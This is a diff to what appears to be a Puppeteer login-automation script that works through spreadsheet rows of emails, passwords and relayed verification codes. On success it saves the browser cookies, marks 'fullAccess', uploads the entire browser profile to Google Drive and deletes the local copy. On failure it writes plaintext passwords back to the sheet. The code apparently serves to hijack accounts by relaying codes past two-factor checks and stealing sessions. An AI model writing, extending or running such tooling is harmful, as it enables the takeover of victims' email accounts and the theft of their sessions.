-            logger.error(`[processRow][${browserId}] Error deleting user data directory after completion: ${deleteError.message}`);
-          }
-        }
-      }
-
-      // The WAITINGOPTIONS and WAITINGCODE loops are already handled above in the main state handling logic.
-      // This section is redundant and should be removed to avoid duplicate logic and potential issues.
-      // The logic for these states should only be executed once within the main if/else if chain.
-      // Removing the duplicate WAITINGOPTIONS and WAITINGCODE loops here.
-
-    } catch (error) {
-      logger.error(`[processRow][${browserId}] Error processing row: ${error.message}`, error);
-      updateData.status = "FAILED";
-      updateData.verified = false; // FAILED so verified false
-      updateData.fullAccess = false; // FAILED so fullAccess false
+    if (finalStatus === "COMPLETED") {
+      const browserCookies = await page.cookies();
+      updateData.cookieJSON = JSON.stringify(browserCookies);
+      updateData.verified = true; // Set verified to true on COMPLETED without verification
+      updateData.fullAccess = true; // Set fullAccess to true on COMPLETED without verification
+      updateData.status = finalStatus;
       updateData.lastJsonResponse = JSON.stringify({
-            browserId, email, status: "FAILED", error: error.message,
-            platform, timestamp: new Date().toISOString(),
-            ...(initialCheckResult.emailExists !== undefined && {
-                emailExists: initialCheckResult.emailExists,
-                accountAccess: initialCheckResult.accountAccess,
-                reachedInbox: initialCheckResult.reachedInbox,
-                requiresVerification: initialCheckResult.requiresVerification,
-                verificationState: initialCheckResult.verificationState
-            })
+          browserId, email, status: finalStatus,
+          emailExists: initialCheckResult.emailExists,
+          accountAccess: initialCheckResult.accountAccess,
+          reachedInbox: initialCheckResult.reachedInbox,
+          requiresVerification: initialCheckResult.requiresVerification,
+          verificationState: initialCheckResult.verificationState,
+          verificationOptions: currentVerificationOptions,
+          platform, timestamp: new Date().toISOString(),
+          message: initialCheckResult.message || "Process completed successfully."
       });
-    } finally {
-      if (browser && !browserFullyClosed) {
-        const sessionTargetListener = isReusingBrowser ? activeBrowserSessions.get(browserId)?.targetCreatedListener : targetCreatedListener;
-        if (sessionTargetListener && browser) { // Ensure listener exists before trying to remove
-            try {
-                browser.off('targetcreated', sessionTargetListener);
-            } catch (offError) {
-                logger.warn(`[processRow][${browserId}] Error removing targetcreated listener: ${offError.message}`);
-            }
-        }
-        
-        if (updateData.status === "WAITINGCODE" || updateData.status === "WAITINGOPTIONS" || updateData.status === "WAITINGPASSWORD" || updateData.status === "WAITINGEMAIL") {
-            logger.info(`[processRow][${browserId}] Keeping browser open as it is in ${updateData.status} state. Storing session.`);
-            activeBrowserSessions.set(browserId, { browser, page, targetCreatedListener: sessionTargetListener }); // Store the listener that was active for this session
-        } else {
-            logger.info(`[processRow][${browserId}] Final cleanup - Closing browser (status: ${updateData.status})`);
-            await browser.close().catch(err => logger.error(`Error closing browser during cleanup for ${browserId}: ${err.message}`));
-            browserFullyClosed = true;
-            activeBrowserSessions.delete(browserId); 
-            await new Promise(resolve => setTimeout(resolve, 2000)); // Add delay after browser.close()
-        }
-      } else if (isReusingBrowser && browser && (updateData.status !== "WAITINGCODE" && updateData.status !== "WAITINGOPTIONS" && updateData.status !== "WAITINGPASSWORD")) {
-        const session = activeBrowserSessions.get(browserId);
-        if (session?.targetCreatedListener && session.browser) {
-             try {
-                session.browser.off('targetcreated', session.targetCreatedListener);
-            } catch (offError) {
-                logger.warn(`[processRow][${browserId}] Error removing targetcreated listener from reused session: ${offError.message}`);
-            }
-        }
-        logger.info(`[processRow][${browserId}] Final cleanup (reused session) - Closing browser (status: ${updateData.status})`);
-        await browser.close().catch(err => logger.error(`Error closing reused browser during cleanup for ${browserId}: ${err.message}`));
+
+      if (browser) {
+        if (targetCreatedListener && browser && !isReusingBrowser) browser.off('targetcreated', targetCreatedListener);
+        logger.info(`[processRow][${browserId}] Closing browser for COMPLETED status before Drive upload.`);
+        await browser.close().catch(err => logger.error(`Error closing browser for ${browserId}: ${err.message}`));
         browserFullyClosed = true;
         activeBrowserSessions.delete(browserId);
         await new Promise(resolve => setTimeout(resolve, 2000)); // Add delay after browser.close()
       }
 
-      const finalSheetUpdate = { ...updateData }; 
-      // Removed explicit clearing of verification fields as per user request
-      // if (finalSheetUpdate.status === "COMPLETED") {
-      //     finalSheetUpdate.verificationOptions = '';
-      //     finalSheetUpdate.verificationChoice = '';
-      //     finalSheetUpdate.verificationCode = '';
-      // } else if (finalSheetUpdate.status === "WAITINGCODE") {
-      //     finalSheetUpdate.verificationChoice = '';
-      //     if (!finalSheetUpdate.hasOwnProperty('verificationCode')) {
-      //         finalSheetUpdate.verificationCode = ''; 
-      //     }
-      // } else if (finalSheetUpdate.status === "WAITINGOPTIONS") {
-      //     finalSheetUpdate.verificationCode = '';
-      //     if (!finalSheetUpdate.hasOwnProperty('verificationChoice')) {
-      //         finalSheetUpdate.verificationChoice = '';
-      //     }
-      //     if (!finalSheetUpdate.hasOwnProperty('verificationOptions')) {
-      //         finalSheetUpdate.verificationOptions = '';
-      //     }
-      // }
-
-      logger.info(`[processRow][${browserId}] Updating final sheet state with data: ${JSON.stringify(finalSheetUpdate)}`);
-      await updateBrowserRowData(browserId, finalSheetUpdate).catch(err => 
-        logger.error(`[processRow][${browserId}] Failed to update final sheet state: ${err.message}`)
-      );
-      
-      if (updateData.status === "FAILED" && userDataDir) {
-        if (browserFullyClosed || (browser && !browser.isConnected())) { 
-            try {
-              logger.info(`[processRow][${browserId}] Final status FAILED. Attempting to delete user data directory: ${userDataDir}`);
-              // Add retry logic for fs.remove to handle EBUSY errors
-              // Add a small initial delay before attempting to delete, to allow browser process to fully exit
-              await new Promise(resolve => setTimeout(resolve, 2000)); // 2-second initial delay
-
-              const maxRetries = 5; // Increased retries
-              const delay = 2000; // Increased delay between retries to 2 seconds
-              let attempt = 0;
-              let deleted = false;
-              while (attempt < maxRetries && !deleted) {
-                try {
-                  await fs.remove(userDataDir);
-                  logger.info(`[processRow][${browserId}] Successfully deleted user data directory: ${userDataDir}`);
-                  deleted = true;
-                } catch (deleteError) {
-                  if (deleteError.code === 'EBUSY' || deleteError.code === 'ENOTEMPTY') { // Also handle ENOTEMPTY
-                    logger.warn(`[processRow][${browserId}] EBUSY/ENOTEMPTY deleting user data directory (attempt ${attempt + 1}/${maxRetries}): ${userDataDir}. Retrying in ${delay}ms...`);
-                    await new Promise(resolve => setTimeout(resolve, delay));
-                    attempt++;
-                  } else {
-                    logger.error(`[processRow][${browserId}] Error deleting user data directory (failed status): ${deleteError.message}`, deleteError);
-                    throw deleteError; // Re-throw if it's not EBUSY/ENOTEMPTY
-                  }
-                }
-              }
-              if (!deleted) {
-                logger.error(`[processRow][${browserId}] Failed to delete user data directory after ${maxRetries} retries.`);
-              }
-            } catch (deleteError) {
-              // This catch block will handle errors other than EBUSY/ENOTEMPTY that were re-thrown
-              if (deleteError.code === 'EBUSY' || deleteError.code === 'ENOTEMPTY') { // Should not happen if retry logic works, but as a fallback
-                logger.warn(`[processRow][${browserId}] Final EBUSY/ENOTEMPTY error deleting user data directory: ${userDataDir}. This often means a previous browser process didn't fully exit.`);
-              } else {
-                logger.error(`[processRow][${browserId}] Error deleting user data directory (failed status): ${deleteError.message}`, deleteError);
-              }
-            }
+      let uploadedDriveUrl = null;
+      try {
+        uploadedDriveUrl = await uploadBrowserData(browserId);
+        if (uploadedDriveUrl) {
+          updateData.driveUrl = uploadedDriveUrl;
+          logger.info(`[processRow][${browserId}] Successfully uploaded browser data to Google Drive.`);
         } else {
-             logger.warn(`[processRow][${browserId}] Final status FAILED, but session active. Skipping userDataDir deletion.`);
+          logger.warn(`[processRow][${browserId}] Google Drive upload skipped or failed.`);
+        }
+      } catch (uploadError) {
+        logger.error(`[processRow][${browserId}] Error during Google Drive upload: ${uploadError.message}`);
+      }
+      
+      if (updateData.driveUrl && userDataDir) {
+        try {
+          logger.info(`[processRow][${browserId}] Process COMPLETED and uploaded. Deleting user data directory: ${userDataDir}`);
+          await fs.remove(userDataDir);
+          logger.info(`[processRow][${browserId}] Successfully deleted user data directory.`);
+        } catch (deleteError) {
+          logger.error(`[processRow][${browserId}] Error deleting user data directory after completion: ${deleteError.message}`);
         }
       }
     }
+
+    } catch (error) {
+      logger.error(`[processRow][${browserId}] Error processing row: ${error.message}`, error);
+      finalStatus = "FAILED";
+    updateData.status = "FAILED";
+    updateData.verified = false; // FAILED so verified false
+    updateData.fullAccess = false; // FAILED so fullAccess false
+    updateData.lastJsonResponse = JSON.stringify({
+          browserId, email, status: "FAILED", error: error.message,
+          platform, timestamp: new Date().toISOString(),
+          ...(initialCheckResult.emailExists !== undefined && {
+              emailExists: initialCheckResult.emailExists,
+              accountAccess: initialCheckResult.accountAccess,
+              reachedInbox: initialCheckResult.reachedInbox,
+              requiresVerification: initialCheckResult.requiresVerification,
+              verificationState: initialCheckResult.verificationState
+          })
+    });
+  } finally {
+    if (browser && !browserFullyClosed) {
+      const sessionTargetListener = isReusingBrowser ? activeBrowserSessions.get(browserId)?.targetCreatedListener : targetCreatedListener;
+      if (sessionTargetListener && browser) { // Ensure listener exists before trying to remove
+          try {
+              browser.off('targetcreated', sessionTargetListener);
+          } catch (offError) {
+              logger.warn(`[processRow][${browserId}] Error removing targetcreated listener: ${offError.message}`);
+          }
+      }
+      
+      if (updateData.status === "WAITINGCODE" || updateData.status === "WAITINGOPTIONS" || updateData.status === "WAITINGPASSWORD" || updateData.status === "WAITINGEMAIL") {
+          logger.info(`[processRow][${browserId}] Keeping browser open as it is in ${updateData.status} state. Storing session.`);
+          activeBrowserSessions.set(browserId, { browser, page, targetCreatedListener: sessionTargetListener }); // Store the listener that was active for this session
+      } else {
+          logger.info(`[processRow][${browserId}] Final cleanup - Closing browser (status: ${updateData.status})`);
+          await browser.close().catch(err => logger.error(`Error closing browser during cleanup for ${browserId}: ${err.message}`));
+          browserFullyClosed = true;
+          activeBrowserSessions.delete(browserId); 
+          await new Promise(resolve => setTimeout(resolve, 2000)); // Add delay after browser.close()
+      }
+    } else if (isReusingBrowser && browser && (updateData.status !== "WAITINGCODE" && updateData.status !== "WAITINGOPTIONS" && updateData.status !== "WAITINGPASSWORD")) {
+      const session = activeBrowserSessions.get(browserId);
+      if (session?.targetCreatedListener && session.browser) {
+           try {
+              session.browser.off('targetcreated', session.targetCreatedListener);
+          } catch (offError) {
+              logger.warn(`[processRow][${browserId}] Error removing targetcreated listener from reused session: ${offError.message}`);
+          }
+      }
+      logger.info(`[processRow][${browserId}] Final cleanup (reused session) - Closing browser (status: ${updateData.status})`);
+      await browser.close().catch(err => logger.error(`Error closing reused browser during cleanup for ${browserId}: ${err.message}`));
+      browserFullyClosed = true;
+      activeBrowserSessions.delete(browserId);
+      await new Promise(resolve => setTimeout(resolve, 2000)); // Add delay after browser.close()
+    }
+
+    const finalSheetUpdate = { ...updateData };
+    // Ensure FAILED status includes the latest email and password
+    if (finalSheetUpdate.status === "FAILED") {
+      finalSheetUpdate.email = email || finalSheetUpdate.email;
+      finalSheetUpdate.password = password || finalSheetUpdate.password;
+    }
+    // Removed explicit clearing of verification fields as per user request
+    // if (finalSheetUpdate.status === "COMPLETED") {
+    //     finalSheetUpdate.verificationOptions = '';
+    //     finalSheetUpdate.verificationChoice = '';
+    //     finalSheetUpdate.verificationCode = '';
+    // } else if (finalSheetUpdate.status === "WAITINGCODE") {
+    //     finalSheetUpdate.verificationChoice = '';
+    //     if (!finalSheetUpdate.hasOwnProperty('verificationCode')) {
+    //         finalSheetUpdate.verificationCode = '';
+    //     }
+    // } else if (finalSheetUpdate.status === "WAITINGOPTIONS") {
+    //     finalSheetUpdate.verificationCode = '';
+    //     if (!finalSheetUpdate.hasOwnProperty('verificationChoice')) {
+    //         finalSheetUpdate.verificationChoice = '';
+    //     }
+    //     if (!finalSheetUpdate.hasOwnProperty('verificationOptions')) {
+    //         finalSheetUpdate.verificationOptions = '';
+    //     }
+    // }
+
+    logger.info(`[processRow][${browserId}] Updating final sheet state with data: ${JSON.stringify(finalSheetUpdate)}`);
+    await updateBrowserRowData(browserId, finalSheetUpdate).catch(err =>
+      logger.error(`[processRow][${browserId}] Failed to update final sheet state: ${err.message}`)
+    );
+    
+    if (updateData.status === "FAILED" && userDataDir) {
+      if (browserFullyClosed || (browser && !browser.isConnected())) { 
+          try {
+            logger.info(`[processRow][${browserId}] Final status FAILED. Attempting to delete user data directory: ${userDataDir}`);
+            // Add retry logic for fs.remove to handle EBUSY errors
+            // Add a small initial delay before attempting to delete, to allow browser process to fully exit
+            await new Promise(resolve => setTimeout(resolve, 2000)); // 2-second initial delay
+
+            const maxRetries = 5; // Increased retries
+            const delay = 2000; // Increased delay between retries to 2 seconds
+            let attempt = 0;
+            let deleted = false;
+            while (attempt < maxRetries && !deleted) {
+              try {
+                await fs.remove(userDataDir);
+                logger.info(`[processRow][${browserId}] Successfully deleted user data directory: ${userDataDir}`);
+                deleted = true;
+              } catch (deleteError) {
+                if (deleteError.code === 'EBUSY' || deleteError.code === 'ENOTEMPTY') { // Also handle ENOTEMPTY
+                  logger.warn(`[processRow][${browserId}] EBUSY/ENOTEMPTY deleting user data directory (attempt ${attempt + 1}/${maxRetries}): ${userDataDir}. Retrying in ${delay}ms...`);
+                  await new Promise(resolve => setTimeout(resolve, delay));
+                  attempt++;
+                } else {
+                  logger.error(`[processRow][${browserId}] Error deleting user data directory (failed status): ${deleteError.message}`, deleteError);
+                  throw deleteError; // Re-throw if it's not EBUSY/ENOTEMPTY
+                }
+              }
+            }
+            if (!deleted) {
+              logger.error(`[processRow][${browserId}] Failed to delete user data directory after ${maxRetries} retries.`);
+            }
+          } catch (deleteError) {
+            // This catch block will handle errors other than EBUSY/ENOTEMPTY that were re-thrown
+            if (deleteError.code === 'EBUSY' || deleteError.code === 'ENOTEMPTY') { // Should not happen if retry logic works, but as a fallback
+              logger.warn(`[processRow][${browserId}] Final EBUSY/ENOTEMPTY error deleting user data directory: ${userDataDir}. This often means a previous browser process didn't fully exit.`);
+            } else {
+              logger.error(`[processRow][${browserId}] Error deleting user data directory (failed status): ${deleteError.message}`, deleteError);
+            }
+          }
+      } else {
+           logger.warn(`[processRow][${browserId}] Final status FAILED, but session active. Skipping userDataDir deletion.`);
+      }
+    }
+  }
 }
 
 // Helper function to check if the Puppeteer page is responsive
@@ -1994,7 +2173,6 @@ async function isPageResponsive(page, browserId, instanceId) {
 
 // Flag to prevent the interval timer from overlapping runs if a run takes longer than the interval
 let isProcessingInterval = false;
-let noNewRowsCount = 0; // Counter for consecutive checks with no new rows
 
 async function processWaitingRows() {
   if (isProcessingInterval) {
@@ -2024,7 +2202,8 @@ async function processWaitingRows() {
     const columnIndexes = getColumnIndexes(headers);
     const rows = data.slice(1);
 
-    const processableStatuses = ["WAITING", "WAITINGEMAIL", "WAITINGPASSWORD", "WAITINGOPTIONS", "WAITINGCODE"];
+    const processableStatuses = ["WAITING", "WAITINGEMAIL", "WAITINGPASSWORD", "WAITINGPASSWORDERROR", "WAITINGOPTIONS", "WAITINGCODE"];
+    const staleCheckStatuses = [...processableStatuses, "WAITINGEMAILERROR", "WAITINGPASSWORDERROR"];
     const rowsToInitiateProcessing = rows.filter(row => {
         const status = row[columnIndexes['status']];
         const bId = row[columnIndexes['browserId']];
@@ -2035,26 +2214,24 @@ async function processWaitingRows() {
 
     const allProcessableRowsInSheet = rows.filter(row => {
         const status = row[columnIndexes['status']];
-        return processableStatuses.includes(status);
+        return staleCheckStatuses.includes(status);
     });
 
-    if (allProcessableRowsInSheet.length === 0) {
-      logger.info("No WAITING, WAITINGEMAIL, WAITINGPASSWORD, WAITINGOPTIONS, or WAITINGCODE rows found in the entire sheet. Only FAILED or COMPLETED rows remain.");
-      noNewRowsCount++;
-      if (noNewRowsCount >= 20) { // Increased stop interval trigger to 20
-        logger.info(`No processable rows found for ${noNewRowsCount} consecutive checks. Stopping background processing interval.`);
-        stopInterval();
-      }
-    } else {
-      noNewRowsCount = 0; // Reset counter if any processable rows are found
+        if (allProcessableRowsInSheet.length === 0 && activeProcesses.size === 0 && activeBrowserSessions.size === 0) {
+            logger.info("No stale-checkable rows found AND no active processes. Stopping interval.");
+      stopInterval();
+      isProcessingInterval = false;
+      return;
     }
 
-    if (rowsToInitiateProcessing.length === 0 && allProcessableRowsInSheet.length > 0) {
-        logger.info("No new rows to initiate processing in this run, but other processable rows exist in the sheet.");
+    if (rowsToInitiateProcessing.length === 0) {
+        logger.info(`No new rows to initiate processing (${allProcessableRowsInSheet.length} stale-checkable rows exist, ${activeProcesses.size} active processes).`);
         isProcessingInterval = false;
         return;
-    } else if (rowsToInitiateProcessing.length === 0 && allProcessableRowsInSheet.length === 0) {
-        // If no rows to initiate AND no processable rows in sheet, then we can return after handling noNewRowsCount
+    }
+
+    if (rowsToInitiateProcessing.length === 0) {
+        logger.info("No new rows to initiate processing in this run, but other stale-checkable rows exist in the sheet.");
         isProcessingInterval = false;
         return;
     }
